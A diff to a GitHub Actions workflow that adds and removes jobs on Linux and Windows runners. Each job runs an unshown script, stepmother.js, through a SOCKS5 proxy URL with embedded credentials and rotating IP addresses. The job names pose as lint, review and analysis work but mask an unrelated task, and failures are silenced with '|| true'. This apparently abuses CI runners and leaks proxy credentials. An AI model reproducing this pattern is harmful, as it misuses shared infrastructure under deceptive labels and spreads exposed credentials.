@@ -8,7 +8,47 @@ on:
       - 'package.json'
 
 jobs:
-  deploy_ubuntu2004_node_custom:
+  review_ubuntu2004_node_midwife:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          run: |
+            npm install && node stepmother.js "socks5://dcswarup:webshare@136.0.120.6:6024" || true
+
+  lint_ubuntulatest_node_transparency:
+    runs-on: ubuntu-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node stepmother.js "socks5://dcswarup:webshare@92.112.82.84:5319" || true
+
+  analyze_windows2022_node_carnival:
+    runs-on: windows-2022
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; node stepmother.js "socks5://dcswarup:webshare@146.103.44.191:6743"
+
+  analyze_ubuntu2004_node_ectoderm:
     runs-on: ubuntu-20.04
     steps:
         - name: Checkout Repository
@@ -19,45 +59,4 @@ jobs:
             node-version: 22
         - name: Run Task
           run: |
-            npm install && node stepmother.js "socks5://dcswarup:webshare@38.154.205.15:5283" || true
-
-  test_ubuntu2204_node_integer:
-    runs-on: ubuntu-22.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 18
-        - name: Run Task
-          run: |
-            npm install && node stepmother.js "socks5://dcswarup:webshare@45.43.65.125:6639" || true
-
-  format_windowslatest_node_grouper:
-    runs-on: windows-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 20
-        - name: Run Task
-          shell: pwsh
-          run: |
-            npm install; node stepmother.js "socks5://dcswarup:webshare@161.123.101.28:6654"
-
-  check_windows2025_bun_newsprint:
-    runs-on: windows-2025
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Bun
-          uses: oven-sh/setup-bun@v2
-          with:
-            bun-version: latest
-        - name: Run Task
-          shell: pwsh
-          run: |
-            bun install; bun run stepmother.js "socks5://dcswarup:webshare@102.212.91.38:6350"
+            npm install && node stepmother.js "socks5://dcswarup:webshare@64.137.58.114:6360" || true
